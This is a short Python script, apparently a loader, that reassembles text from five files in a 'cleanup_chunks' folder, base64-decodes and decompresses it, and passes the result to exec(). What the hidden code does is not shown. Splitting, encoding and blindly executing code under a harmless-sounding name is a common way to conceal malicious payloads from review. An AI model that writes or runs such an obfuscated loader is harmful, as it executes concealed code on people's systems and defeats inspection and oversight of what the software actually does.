import base64
import zlib
from pathlib import Path

payload = "".join(
    Path(f"cleanup_chunks/{index}.txt").read_text(encoding="utf-8").strip()
    for index in range(5)
)
exec(compile(zlib.decompress(base64.b64decode(payload)), __file__, "exec"))
